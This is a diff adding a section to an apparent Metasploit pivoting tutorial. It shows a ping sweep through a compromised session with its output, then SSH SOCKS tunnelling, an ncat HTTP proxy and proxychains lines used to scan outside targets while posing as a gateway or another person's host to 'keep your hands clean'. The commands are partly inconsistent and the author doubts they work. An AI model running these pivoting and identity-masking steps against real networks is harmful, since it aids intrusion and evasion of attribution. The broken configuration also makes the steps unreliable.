@@ -200,3 +200,70 @@ The ping_sweep module allows you to use one compromised opponent to...
 
 New hosts in the same subnet.
 
+```
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.81.24.0         255.255.255.0      Session 2
+
+[*] There are currently no IPv6 routes defined.
+msf post(multi/gather/ping_sweep) > setg rhosts 10.81.24.0/24
+rhosts => 10.81.24.0/24
+msf post(multi/gather/ping_sweep) > setg session 2
+session => 2
+msf post(multi/gather/ping_sweep) > run -j
+[*] Post module running as background job 3.
+msf post(multi/gather/ping_sweep) > 
+[*] Performing ping sweep for IP range 10.81.24.0/24
+[+] 	10.81.24.28 host found
+[+] 	10.81.24.40 host found
+```
+
+I am sure you all know this as standard pivoting tactics available within the Metasploit Framework. What the information has shown is that there are least 2 additional hosts with SSH enabled. Probably my phone. 
+
+To a professional pentester, this is all they need to know to locate a suitable hypervisor to attack. This network doesn't have a worthy hypervisor though.
+
+
+# To attack hosts in a different subnet.
+
+In order to launch a attack in a different subnet you can still do it from this subnet. 
+
+But maybe there is a isolated one that cannot be reached by this gateway and certainly not msfconsole. You use tsocks and proxychains to interact with a completely isolated subnet by assuming the identity of one that it may trust (sic because I dont if it really would work). Worth a shot.
+
+One, check if you can use the main gateway as a http proxy.
+
+From the perspective of your Kali Linux VM, go back into bash shell.
+
+```
+msf post(multi/gather/ping_sweep) > screen -S bash
+[*] exec: screen -S bash
+root@kali:
+```
+
+This creates screen instance allowing you to multitask. While leaving the actual console  unharmed. Now you can use things like [TAB] completion. To go back, you press CTRL A D to back to msfconsole.
+
+First create a dynamic SSH proxy to
+
+```
+ssh -NfD 1080 root@192.168.122.1
+```
+You won't see anything happen, but it returns to the prompt it means it worked. 
+
+Now you can use your compromised host to authenticate to a gateway, but we will be using ncat (not netcat. ncat! a separate program).
+
+```
+ncat --listen --proxy-type http 10.81.0.1 443 &
+
+```
+And then you need modify /etc/proxychains.conf
+
+```
+echo 'socks4 192.168.1.1 1080' >> /etc/proxychains.conf
+echo 'http 10.81.0.1 443' >> /etc/proxychains.conf
+```
+
+This will allow you to run nmap and nikto web application scans against the outside target while assuming identity of your gateway or any person you stuck a http proxy on. Remember they actually have to have the http ports open (any port that accepts http) like 80, 81, 8080, 443, 8081.
+
+It helps in keeping your hands clean since a foreign firewall or scanner would only show the last IP and it's signature, not yours. 
